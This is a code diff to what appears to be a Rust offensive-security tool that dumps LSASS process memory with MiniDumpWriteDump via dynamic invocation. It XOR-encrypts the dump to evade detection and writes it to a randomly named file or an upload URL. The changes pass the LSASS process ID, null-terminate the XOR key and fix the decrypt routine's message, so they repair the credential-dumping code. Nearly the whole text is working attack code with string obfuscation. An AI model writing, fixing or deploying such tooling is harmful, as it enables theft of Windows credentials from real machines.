@@ -356,7 +356,7 @@ pub fn dump(key: &str, url: &str, leak: bool) {
                             // We use the duplicated handle to dump the process memory
                             let x = dinvoke::mini_dump_write_dump(
                                 *dup_handle,
-                                0, // Process Id is not required
+                                lsass_pid.into(),
                                 transacted_file_handle,
                                 0x00000002, // MiniDumpWithFullMemory
                                 ptr::null_mut(),
@@ -408,6 +408,7 @@ pub fn dump(key: &str, url: &str, leak: bool) {
 
                                 let mut view_ptr = ret as *mut u8;
 
+                                let key = format!("{}{}", key, "\0");
                                 let mut key_ptr = key.as_ptr();
                                 let mut xor_key: u8 = *key_ptr;
                                 key_ptr = key_ptr.add(1);
@@ -417,14 +418,13 @@ pub fn dump(key: &str, url: &str, leak: bool) {
                                     key_ptr = key_ptr.add(1);
                                 }
 
-
                                 let mut view_xor: Vec<u8> = vec![];
                                 for _i in 0..dump_size
                                 {
                                     view_xor.push(*view_ptr ^ xor_key);
                                     view_ptr = view_ptr.add(1);
                                 }
-
+                               
                                 let rand_string: String = thread_rng()
                                 .sample_iter(&Alphanumeric)
                                 .take(7)
@@ -432,13 +432,12 @@ pub fn dump(key: &str, url: &str, leak: bool) {
                                 .collect();
 
                                 if url == ""
-                                {
-
-                                    let file_name = format!("{}{}", rand_string, ".txt");
-                                    let mut file = std::fs::File::create(&file_name).unwrap();
+                                {                 
+                                    let output_path = format!("{}{}", rand_string, ".txt");
+                                    let mut file = std::fs::File::create(&output_path).unwrap();
                                     let _r = file.write(&view_xor).unwrap();
 
-                                    println!("{} {}.", &lc!("[+] Memory dump written to file"), file_name.as_str());
+                                    println!("{} {}.", &lc!("[+] Memory dump written to file"), output_path.as_str());
 
                                 }
                                 else
@@ -802,7 +801,7 @@ pub fn decrypt (file_path: &str, key: &str, output_file: &str)
 
 
         let mut buffer_ptr = buffer.as_ptr();
-
+        let key = format!("{}{}", key, "\0");
         let mut key_ptr = key.as_ptr();
         let mut xor_key: u8 = *key_ptr;
         key_ptr = key_ptr.add(1);
@@ -823,6 +822,6 @@ pub fn decrypt (file_path: &str, key: &str, output_file: &str)
         let _r = output.write_all(&file_content).unwrap();
     }
 
-    println!("{}", &lc!("[+] Successfully unencrypted minidump file."))
+    println!("{}", &lc!("[+] Successfully decrypted minidump file."))
 
 }
